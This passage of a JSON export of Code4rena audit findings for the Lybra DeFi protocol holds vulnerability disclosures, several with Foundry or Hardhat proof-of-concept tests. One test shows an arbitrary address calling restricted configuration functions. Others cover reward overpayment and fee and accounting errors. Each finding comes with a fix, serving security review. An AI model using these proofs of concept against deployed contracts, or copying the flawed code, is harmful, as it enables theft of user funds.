"high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-17"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/solsaver-Q.md)."}, {"title": "Incorrectly implemented modifiers in LybraConfigurator.sol allow any address to call functions that are supposed to be restricted", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/704", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-03"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/configuration/LybraConfigurator.sol#L85-L93   # Vulnerability details  ## Impact The modifiers onlyRole(bytes32 role) and checkRole(bytes32 role) are not implemented correctly. This would allow anybody to call sensitive functions that should be restricted.  ## Proof of Concept For the POC, I set up a new foundry projects, and copied the folders lybra, mocks and OFT in the src folder of the new project. I installed the dependencies and then I created a file POCs.t.sol in the test folder. Here is the code that shows than a random address can call sensitive functions that should be restricted:  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\"; import \"../src/lybra/configuration/LybraConfigurator.sol\"; import \"../src/lybra/governance/GovernanceTimelock.sol\"; import \"../src/lybra/miner/esLBRBoost.sol\";  contract POCsTest is Test {     Configurator public lybraConfigurator;     GovernanceTimelock public governance;     esLBRBoost public boost;      address public dao = makeAddr(\"dao\");     address public curvePool = makeAddr(\"curvePool\");     address public randomUser = makeAddr(\"randomUser\");     address public admin = makeAddr(\"admin\");      address public eusd = makeAddr(\"eusd\");     address public pEusd = makeAddr(\"pEusd\");      address proposerOne = makeAddr(\"proposerOne\");     address executorOne = makeAddr(\"executorOne\");      address[] proposers = [proposerOne];     address[] executors = [executorOne];      address public rewardsPool = makeAddr(\"rewardsPool\");      function setUp() public {         governance = new GovernanceTimelock(10000, proposers, executors, admin);         lybraConfigurator = new Configurator(address(governance), curvePool);         boost = new esLBRBoost();     }      function testIncorrectlyImplementedModifiers() public {         console.log(\"EUSD BEFORE\", address(lybraConfigurator.EUSD()));         vm.prank(randomUser);         lybraConfigurator.initToken(eusd, pEusd);         console.log(\"EUSD AFTER\", address(lybraConfigurator.EUSD()));          console.log(\"RewardsPool BEFORE\", address(lybraConfigurator.lybraProtocolRewardsPool()));         vm.prank(randomUser);         lybraConfigurator.setProtocolRewardsPool(rewardsPool);         console.log(\"RewardsPool AFTER\", address(lybraConfigurator.lybraProtocolRewardsPool()));     } } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Wrap the 2 function calls in a require statement:  In modifier onlyRole(bytes32 role), instead of GovernanceTimelock.checkOnlyRole(role, msg.sender); it should be something like require(GovernanceTimelock.checkOnlyRole(role, msg.sender), \"Not Authorized\").  The same goes for the checkRole(bytes32 role) modifier.   ## Assessed type  Access Control"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/698", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-18"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/Iurii3-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/688", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-19"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/squeaky_cactus-Q.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/686", "labels": ["analysis", "high quality report", "satisfactory", "sponsor confirmed"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/LokiThe5th-Analysis.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/683", "labels": ["bug", "grade-b", "high quality report", "QA (Quality Assurance)", "sponsor confirmed", "Q-20"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/CrypticShepherd-Q.md)."}, {"title": "LybraPeUSDVaultBase.rigidRedemption should use getBorrowedOf instead of borrowed", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/679", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L157-L168   # Vulnerability details  ## Impact In LybraPeUSDVaultBase, the return value of getBorrowedOf represents the user's debt, while borrowed only represents the user's borrowed funds and does not include fees. Using borrowed instead of getBorrowedOf in rigidRedemption results in 1. the requirement for the peusdAmount parameter is smaller than it actually is 2. the calculated providerCollateralRatio is larger, so that rigidRedemption can be performed even if the actual providerCollateralRatio is less than 100e18. ```solidity     function rigidRedemption(address provider, uint256 peusdAmount) external virtual {         require(configurator.isRedemptionProvider(provider), \"provider is not a RedemptionProvider\");         require(borrowed[provider] >= peusdAmount, \"peusdAmount cannot surpass providers debt\");         uint256 assetPrice = getAssetPrice();         uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider];         require(providerCollateralRatio >= 100 * 1e18, \"provider's collateral ratio should more than 100%\");         _repay(msg.sender, provider, peusdAmount);         uint256 collateralAmount = (((peusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;         depositedAsset[provider] -= collateralAmount;         collateralAsset.transfer(msg.sender, collateralAmount);         emit RigidRedemption(msg.sender, provider, peusdAmount, collateralAmount, block.timestamp);     } ``` ## Proof of Concept https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L157-L168 ## Tools Used None ## Recommended Mitigation Steps Change to ```diff     function rigidRedemption(address provider, uint256 peusdAmount) external virtual {         require(configurator.isRedemptionProvider(provider), \"provider is not a RedemptionProvider\"); -       require(borrowed[provider] >= peusdAmount, \"peusdAmount cannot surpass providers debt\"); +       require(getBorrowedOf(provider) >= peusdAmount, \"peusdAmount cannot surpass providers debt\");         uint256 assetPrice = getAssetPrice(); -       uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider]; +       uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / getBorrowedOf(provider);         require(providerCollateralRatio >= 100 * 1e18, \"provider's collateral ratio should more than 100%\");         _repay(msg.sender, provider, peusdAmount);         uint256 collateralAmount = (((peusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;         depositedAsset[provider] -= collateralAmount;         collateralAsset.transfer(msg.sender, collateralAmount);         emit RigidRedemption(msg.sender, provider, peusdAmount, collateralAmount, block.timestamp);     } ```   ## Assessed type  Error"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/678", "labels": ["analysis-advanced", "grade-a", "satisfactory", "sponsor confirmed", "A-05"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/0xbrett8571-Analysis.md)."}, {"title": "The Constructor Caveat leads to bricking of Configurator contract.", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/673", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-04"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/configuration/LybraConfigurator.sol#L80   # Vulnerability details  ## Impact - In Solidity, code that is inside a constructor or part of a global variable declaration is not part of a deployed contract\u2019s runtime bytecode. This code is executed only once, when the contract instance is deployed. As a consequence of this, the code within a logic contract\u2019s constructor will never be executed in the context of the proxy\u2019s state. This means that any state changes made in the constructor of a logic contract will not be reflected in the proxy\u2019s state.    1. This will lead to governance timelocks contract and the curvePool contract contain default values of zero values.    2. As a result all the function that relly on governance will be broken. Since the governance address is set to zero address.  ## Proof of Concept  ```s // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import \"forge-std/Test.sol\"; import {ITransparentUpgradeableProxy} from \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";  import {LybraProxy} from \"@lybra/Proxy/LybraProxy.sol\"; import {LybraProxyAdmin} from \"@lybra/Proxy/LybraProxyAdmin.sol\"; import {GovernanceTimelock} from \"@lybra/governance/GovernanceTimelock.sol\"; import {PeUSDMainnet} from \"@lybra/token/PeUSDMainnetStableVision.sol\"; import {Configurator} from \"@lybra/configuration/LybraConfigurator.sol\"; import {EUSDMock} from \"@mocks/mockEUSD.sol\"; import {mockCurve} from \"@mocks/mockCurve.sol\"; import {mockUSDC} from \"@mocks/mockUSDC.sol\";  /* remappings used @lybra=contracts/lybra/ @mocks=contracts/mocks/  */ contract CounterScript is Test {     address goerliEndPoint = 0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23;      LybraProxy proxy;     LybraProxyAdmin admin;     GovernanceTimelock govTimeLock;     mockUSDC usdc;     mockCurve curve;     Configurator configurator;     Configurator configuratorLogic;      EUSDMock eusd;     PeUSDMainnet peUsdMainnet;     address owner = address(7);     address[] govTimelockArr;       function setUp() public {          vm.startPrank(owner);          govTimelockArr.push(owner);          govTimeLock = new GovernanceTimelock(              1,              govTimelockArr,              govTimelockArr,              owner          );           usdc = new mockUSDC();          curve = new mockCurve();          eusd = new EUSDMock(address(configurator));          //  _dao , _curvePool          configuratorLogic = new Configurator(address(govTimeLock), address(curve));           admin = new LybraProxyAdmin();          proxy = new LybraProxy(address(configuratorLogic),address(admin),bytes(\"\"));          configurator = Configurator(address(proxy));          peUsdMainnet = new PeUSDMainnet(              address(configurator),              8,              goerliEndPoint          );          vm.stopPrank();     }      function test_LybraConfigurationContractDoesNotInitialize() public {         vm.startPrank(address(owner));         vm.expectRevert(); // Since the Governance time lock is set to zero.          configurator.initToken(address(eusd), address(peUsdMainnet));     } } ```  ## Tools Used 1. Manual Code review 2. Foundry for POC  ## Recommended Mitigation Steps - [LybraConfiguration.sol#L81](https://github.com/code-423n4/2023-06-lybra/blob/5d70170f2c68dbd3f7b8c0c8fd6b0b2218784ea6/contracts/lybra/configuration/LybraConfigurator.sol#L81) contracts should move the code within the constructor to a regular 'initializer' function, and have this function be called whenever the proxy links to this logic contract. Special care needs to be taken with this initialize function so that it can only be called once and use another initialization mechanism since the governance address should be set in the initialize.   ## Assessed type  Upgradable"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/666", "labels": ["analysis-advanced", "grade-a", "selected for report", "sponsor confirmed", "A-06"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/Sathish9098-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/619", "labels": ["analysis-advanced", "grade-b", "satisfactory", "sponsor confirmed", "A-07"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/hl_-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/613", "labels": ["analysis-advanced", "grade-b", "satisfactory", "sponsor confirmed", "A-08"], "target": "2023-06-lybra-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-06-lybra-findings/blob/main/data/ABAIKUNANBAEV-Analysis.md)."}, {"title": "Incorrect Reward Distribution Calculation in `ProtocolRewardsPool`", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/604", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-10"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L190-L218   # Vulnerability details  # Incorrect Reward Distribution Calculation in `ProtocolRewardsPool`    This report highlights a vulnerability in the `ProtocolRewardsPool` contract. The `getReward()` function, designed to distribute rewards to users, uses an incorrect calculation method that can result in incorrect reward distribution.  ## Impact  In the `ProtocolRewardsPool` contract, a user can call the `getReward()` function to receive the rewards. The function first tries to pay the reward using `eUSD` token, and if enough amount of tokens was not available, it will use `peUSD`, and `stableToken` in the next steps. However, the protocol compares the number of shares with the amount of reward to send the reward.  If one share corresponds to a value greater than 1 `eUSD`, which is typically the case, users can be overpaid when claiming rewards. This can result in a significant discrepancy between the actual reward amount and the amount distributed.  ## Proof of Concept  When a user invokes the `ProtocolRewardsPool.getReward()` function, the contract attempts to distribute the rewards using the `EUSD` token:  [(ProtocolRewardsPool.sol#L190-L218)](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L190-L218)  ```solidity function getReward() external updateReward(msg.sender) {     uint reward = rewards[msg.sender];     if (reward > 0) {         rewards[msg.sender] = 0;         IEUSD EUSD = IEUSD(configurator.getEUSDAddress());         uint256 balance = EUSD.sharesOf(address(this));         uint256 eUSDShare = balance >= reward ? reward : reward - balance;         EUSD.transferShares(msg.sender, eUSDShare);         if (reward > eUSDShare) {             ERC20 peUSD = ERC20(configurator.peUSD());             uint256 peUSDBalance = peUSD.balanceOf(address(this));             if (peUSDBalance >= reward - eUSDShare) {                 peUSD.transfer(msg.sender, reward - eUSDShare);                 emit ClaimReward(                     msg.sender,                     EUSD.getMintedEUSDByShares(eUSDShare),                     address(peUSD),                     reward - eUSDShare,                     block.timestamp                 );             } else {                 if (peUSDBalance > 0) {                     peUSD.transfer(msg.sender, peUSDBalance);                 }                 ERC20 token = ERC20(configurator.stableToken());                 uint256 tokenAmount = ((reward - eUSDShare - peUSDBalance) *                     token.decimals()) / 1e18;                 token.transfer(msg.sender, tokenAmount);                 emit ClaimReward(                     msg.sender,                     EUSD.getMintedEUSDByShares(eUSDShare),                     address(token),                     reward - eUSDShare,                     block.timestamp                 );             }         } else {             emit ClaimReward(                 msg.sender,                 EUSD.getMintedEUSDByShares(eUSDShare),                 address(0),                 0,                 block.timestamp             );         }     } } ```   To determine the available shares for rewarding users, the function calculates the shares of the `eUSD` token held by the contract and compares it with the total reward to be distributed.  Here is the code snippet illustrating this calculation:  ```solidity uint256 balance = EUSD.sharesOf(address(this)); uint256 eUSDShare = balance >= reward ? reward : reward - balance; ```  However, the comparison of shares with the reward in this manner is incorrect.  Let's consider an example to understand the problem. Suppose `rewards[msg.sender]` is equal to \\$10 worth of `eUSD`, and the shares held by the contract are 9 shares. If each share corresponds to \\$10 worth `eUSD`, the contract mistakenly assumes it does not have enough balance to cover the entire reward, because it has 9 shares; however, having 9 shares is equivalent to having \\$90 worth of `eUSD`. Consequently, it first sends 9 shares, equivalent to \\$90 worth of `eUSD`, and then sends \\$1 worth `peUSD`. However, the sum of these sent values is \\$91 worth of `eUSD`, while the user's actual reward is only \\$10 worth `eUSD`.  This issue can lead to incorrect reward distribution, causing users to receive significantly more or less rewards than they should.    ## Tools Used  Manual Review    ## Recommended Mitigation Steps  To address this issue, it is recommended to replace the usage of `eUSDShare` with `EUSD.getMintedEUSDByShares(eUSDShare)` in the following lines:  -   [ProtocolRewardsPool.sol#L198](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L198) -   [ProtocolRewardsPool.sol#L201-L202](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L201-L202) -   [ProtocolRewardsPool.sol#L209](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/ProtocolRewardsPool.sol#L209)  This ensures that the correct amount of `eUSD` is transferred to the user while maintaining the accuracy of reward calculations.   ## Assessed type  Math"}, {"title": "Protocol may lose income because of how fees acquisition works; users may pay too high fees", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/542", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "high quality report", "primary issue", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/configuration/LybraConfigurator.sol#L213-L217 https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L295-L302 https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L230-L239   # Vulnerability details  Fees for protocol are calculated incorrectly in `LybraEUSDVaultBase` and `LybraPEUSDVaultBase`. New fees are calculated as follows: ```solidity function _newFee(address user) internal view returns (uint256) {         return (borrowed[user] * configurator.vaultMintFeeApy(address(this)) * (block.timestamp - feeUpdatedAt[user])) / (86400 * 365) / 10000;     } ``` They are updated whenever a user performs some important action, like `repay` and only the newest fee value is used, even if it was different for the entire time.  The following scenarios could happen: - `vaultMintFeeApy` is set to a high value (say 2%) -> some user deposits assets -> after 1 year, fees are reduced (say, to 1%) -> user didn't do anything with his loan for the last year and now he spots that fee decreased, so he performs a dummy transaction so that `feeStored` for him is calculated using the new fee - it will reduce his fee twice, although he should pay the 2% fee for that year - `vaultMintFeeApy` is set to a low value (say 1%) -> some user deposits assets -> after 1 year, fees are increased (say, to 2%) -> user didn't do anything with his loan for the last year, so the fee wasn't updated for him, but now he decides to do some action which will update his fee (for instance can repay some part of his debt) -> protocol will calculate fee as 2% for the entire year, despite that it was 1% and just changed a while ago to 2%  ## Impact Protocol will lose some income, or users will pay higher fees than they should. From Code4Rena docs: ``` 2 \u2014 Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements. ``` Here, value is leaked, but there are external requirements: - user has to do nothing with his money for some (potentially long) time - fees have to be reduced / increased at some point  Hence, this submission was classified as Medium.  ## Proof of Concept Please run the following hardhat test: ``` const {ethers} = require(\"hardhat\"); const {Contract} = require(\"ethers\"); const {Interface} = require(\"ethers/lib/utils\"); const {mine} = require(\"@nomicfoundation/hardhat-network-helpers\"); const { assert, expect } = require(\"chai\");  function toEther(quantity) {   return ethers.utils.parseEther(quantity); }  function format(quantity) {   return ethers.utils.formatEther(quantity); }  async function setUpConfigVault(Configurator, Vault) {     await Configurator.setMintVault(Vault.address, true);     await Configurator.setMintVaultMaxSupply(Vault.address, toEther(\"10000000000\"));     await Configurator.setBorrowApy(Vault.address, 200);        await Configurator.setSafeCollateralRatio(Vault.address, toEther(\"160\"));     await Configurator.setBadCollateralRatio(Vault.address, toEther(\"150\"));     await Configurator.setKeeperRatio(Vault.address, 5); }  async function deploy() {   const goerliEndPoint = '0xbfD2135BFfbb0B5378b56643c2Df8a87552Bfa23'   const goerliChainId = 10121      /// INTERFACES    const IStETH = new Interface([     \"function submit(address) external payable returns (uint256)\"   ]);    const IWBETH = new Interface([     \"function exchangeRate() external view returns (uint256)\",     \"function deposit(address) external payable\",     \"function balanceOf(address) public view returns (uint256)\"   ]);    const IWstETH = new Interface([     \"function stEthPerToken() external view returns (uint256)\",     \"function wrap(uint256) external returns (uint256)\",     \"function balanceOf(address) public view returns (uint256)\"   ]);    const IRETH = new Interface([     \"function getExchangeRate() external view returns (uint256)\",     \"function balanceOf(address) public view returns (uint256)\"   ]);    /// ADRESSES   STETH_ADDRESS = \"0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84\";   WBETH_ADDRESS = \"0xa2E3356610840701BDf5611a53974510Ae27E2e1\";   WSTETH_ADDRESS = \"0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0\";   RETH_ADDRESS = \"0xae78736Cd615f374D3085123A210448E74Fc6393\";   RK_POOL_ADDRESS = \"0xDD3f50F8A6CafbE9b31a427582963f465E745AF8\";    accounts = await ethers.getSigners()   owner = accounts[0].address   Alice = accounts[1];   Bob = accounts[2];   Charlie = accounts[3]    /// ON CHAIN CONTRACTS   StETH = new Contract(STETH_ADDRESS, IStETH, ethers.provider);   WBETH = new Contract(WBETH_ADDRESS, IWBETH, ethers.provider);   WSTETH = new Contract(WSTETH_ADDRESS, IWstETH, ethers.provider);   RETH = new Contract(RETH_ADDRESS, IRETH, ethers.provider);    /// FACTORIES   const OracleFactory = await ethers.getContractFactory(\"mockChainlink\")   const EUSDFactory = await ethers.getContractFactory(\"EUSD\")   const ConfiguratorFactory = await ethers.getContractFactory(\"Configurator\")   const LybraStETHDepositVaultFactory = await ethers.getContractFactory(\"LybraStETHDepositVault\")   const GovernanceTimelockFactory = await ethers.getContractFactory(\"GovernanceTimelock\")   const EUSDMiningIncentivesFactory = await ethers.getContractFactory(\"EUSDMiningIncentives\")   const esLBRBoostFactory = await ethers.getContractFactory(\"esLBRBoost\")   const LBRFactory = await ethers.getContractFactory(\"LBR\")   const esLBRFactory = await ethers.getContractFactory(\"esLBR\")   const PeUSDMainnetFactory = await ethers.getContractFactory(\"PeUSDMainnet\")   const ProtocolRewardsPoolFactory = await ethers.getContractFactory(\"ProtocolRewardsPool\")   const mockCurveFactory = await ethers.getContractFactory(\"mockCurve\")   const mockUSDCFactory = await ethers.getContractFactory(\"mockUSDC\")   const mockLBRPriceOracleFactory = await ethers.getContractFactory(\"mockLBRPriceOracle\")   const LybraWBETHVaultFactory = await ethers.getContractFactory(\"LybraWBETHVault\");   const LybraWstETHVaultFactory = await ethers.getContractFactory(\"LybraWstETHVault\");   const LybraRETHVaultFactory = await ethers.getContractFactory(\"LybraRETHVault\");    /// DEPLOYMENTS   const Oracle = await OracleFactory.deploy()   const mockLBRPriceOracle = await mockLBRPriceOracleFactory.deploy()   const GovernanceTimelock = await GovernanceTimelockFactory.deploy(1,[owner],[owner],owner);   const esLBRBoost = await esLBRBoostFactory.deploy()   const mockUSDC = await mockUSDCFactory.deploy()   const mockCurvePool = await mockCurveFactory.deploy()   Configurator = await ConfiguratorFactory.deploy(GovernanceTimelock.address, mockCurvePool.address)   const LBR = await LBRFactory.deploy(Configurator.address, 8, goerliEndPoint)   const esLBR = await esLBRFactory.deploy(Configurator.address)   EUSD = await EUSDFactory.deploy(Configurator.address)   //await Configurator.initEUSD(eusdMock.address)   const EUSDMiningIncentives = await EUSDMiningIncentivesFactory.deploy(Configurator.address, esLBRBoost.address, Oracle.address, mockLBRPriceOracle.address)   const ProtocolRewardsPool = await ProtocolRewardsPoolFactory.deploy(Configurator.address)   PEUSD = await PeUSDMainnetFactory.deploy(Configurator.address, 8, goerliEndPoint)    /// CONFIGURATIONS   await mockCurvePool.setToken(EUSD.address, mockUSDC.address)      await Configurator.setPremiumTradingEnabled(true);   await Configurator.setEUSDMiningIncentives(EUSDMiningIncentives.address)   await Configurator.initToken(EUSD.address, PEUSD.address)   await EUSDMiningIncentives.setToken(LBR.address, esLBR.address)   await ProtocolRewardsPool.setTokenAddress(esLBR.address, LBR.address, esLBRBoost.address);    /// VAULT DEPLOYMENTS   LybraWBETHVault = await LybraWBETHVaultFactory.deploy(PEUSD.address, Oracle.address, WBETH_ADDRESS, Configurator.address)   StETHVault = await LybraStETHDepositVaultFactory.deploy(Configurator.address, STETH_ADDRESS, Oracle.address)   LybraWstETHVault = await LybraWstETHVaultFactory.deploy(STETH_ADDRESS, PEUSD.address, Oracle.address, WSTETH_ADDRESS, Configurator.address);   LybraRETHVault = await LybraRETHVaultFactory.deploy(PEUSD.address, Configurator.address, RETH_ADDRESS, Oracle.address, RK_POOL_ADDRESS);    setUpConfigVault(Configurator, StETHVault).catch(err => console.error(err));;   setUpConfigVault(Configurator, LybraWBETHVault).catch(err => console.error(err));;   setUpConfigVault(Configurator, LybraWstETHVault).catch(err => console.error(err));   setUpConfigVault(Configurator, LybraRETHVault).catch(err => console.error(err)); }  describe(\"Test\", function ()  {   before(async () => {     const MAINNET_FORKING_URL = \"<URL>\";     await ethers.provider.send(\"hardhat_reset\", [{       forking: { jsonRpcUrl: MAINNET_FORKING_URL, blockNumber: 17598029 }     }]);     await deploy();   });    it(\"4. vaultMintFeeApy calculated incorrectly\", async function () {     await Configurator.setBorrowApy(LybraWBETHVault.address, 200);     // Alice and Bob borrow the same amount of PEUSD     await LybraWBETHVault.connect(Alice).depositEtherToMint(toEther(\"100000\"), {value: toEther(\"120\")});     await LybraWBETHVault.connect(Bob).depositEtherToMint(toEther(\"100000\"), {value: toEther(\"120\")});     // simulate time lapse     await mine(7200 * 365);      // Bob deposits some more assets before borrow APY was changed     await LybraWBETHVault.connect(Bob).depositEtherToMint(1, {value: toEther(\"1\")});      await Configurator.setBorrowApy(LybraWBETHVault.address, 100);     // Alice deposits right after borrow APY changes to get a lower fee     await LybraWBETHVault.connect(Alice).depositEtherToMint(1, {value: toEther(\"1\")});     console.log(`Fee stored for Alice: ${format(await LybraWBETHVault.feeStored(Alice.address))}`);     console.log(`Fee stored for Bob: ${format(await LybraWBETHVault.feeStored(Bob.address))}`);   }); })  ``` It's necessary to replace <URL> with a valid RPC URL and to fix wrong interface in `LybraWBETHVault`. Please also change `feeStored` mapping in `LybraPeUSDVaultBase.sol` to public.  ## Tools Used VS Code  ## Recommended Mitigation Steps  It seems that there is no good mitigation - if we wanted to calculate fees precisely, some additional mapping with time intervals and fees during these intervals would have to be introduced, but this would make transactions more expensive for users, since `_newFee` would read from storage every time. Alternatively, one of the following options could be chosen: - just acknowledge the issue, accept that protocol may receive less income and make it very clear for users that fees are calculated in the way they are, so that they are aware that they can potentially pay higher fees than they should - don't change fees once they are set - potentially just store them as immutable variables in each vault      ## Assessed type  Other"}, {"title": "Understatement of `poolTotalPeUSDCirculation` amounts due to incorrect accounting after function `_repay` is called", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/532", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-11"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L192-L210   # Vulnerability details  ## Impact Incorrect accounting of `poolTotalPeUSDCirculation`, resulting in an understatement of `poolTotalPeUSDCirculation` amounts. This causes inaccurate bookkeeping and in turn affects any other functions dependent on the use of `poolTotalPeUSDCirculation`.   ## Proof of Concept We look at function `_repay` of `LybraPeUSDVaultBase.sol` as [follows](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L192-L210):  ```solidity  function _repay(address _provider, address _onBehalfOf, uint256 _amount) internal virtual {      try configurator.refreshMintReward(_onBehalfOf) {} catch {}      _updateFee(_onBehalfOf);      uint256 totalFee = feeStored[_onBehalfOf];      uint256 amount = borrowed[_onBehalfOf] + totalFee >= _amount ? _amount : borrowed[_onBehalfOf] + totalFee;      if(amount >= totalFee) {          feeStored[_onBehalfOf] = 0;          PeUSD.transferFrom(_provider, address(configurator), totalFee);          PeUSD.burn(_provider, amount - totalFee);      } else {          feeStored[_onBehalfOf] = totalFee - amount;          PeUSD.transferFrom(_provider, address(configurator), amount);      }      try configurator.distributeRewards() {} catch {}      borrowed[_onBehalfOf] -= amount;      poolTotalPeUSDCirculation -= amount;        emit Burn(_provider, _onBehalfOf, amount, block.timestamp);  } ```  In particular, note the accounting of `poolTotalPeUSDCirculation` after repayment as [follows](https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L207):  ```solidity         poolTotalPeUSDCirculation -= amount; ```  Consider a scenario per below for user Alice, where:  amount borrowed = 200 totalFee = 2  | Repay Scenario (PeUSD)        |         | |-------------------------------|--------:| | _amount input                 |     100 | | totalFee                      |       2 | | amount (repay)                |     100 | | Fees left                     |       0 | | PeUSD transfer to config addr |       2 | | PeUSD burnt                   |      98 | | borrowed[Alice]               |     100 | | poolTotalPeUSDCirculation (X) | X - 100 |   - Based on the accounting flow of the function, the fees incurred are transferred to `address(configurator)`.  - The amount burned is `amount - totalFee`. - However, we see that `poolTotalPeUSDCirculation` reduces the entire `amount` where it should be `amount - totalFee` reduced.  - This results in an understatement of `poolTotalPeUSDCirculation` amounts.   ## Tools Used Manual review  ## Recommended Mitigation Steps  Correct the accounting as follows:  ```solidity    -     poolTotalPeUSDCirculation -= amount;    +     poolTotalPeUSDCirculation -= (amount - totalFee); ```   ## Assessed type  Error"}, {"title": "Rewards for initial period can be lost in all of the synthetix derivative contracts", "html_url": "https://github.com/code-423n4/2023-06-lybra-findings/issues/484", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-12"], "target": "2023-06-lybra-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-06-lybra/blob/7b73ef2fbb542b569e182d9abf79be643ca883ee/contracts/lybra/miner/stakerewardV2pool.sol#L132-L150 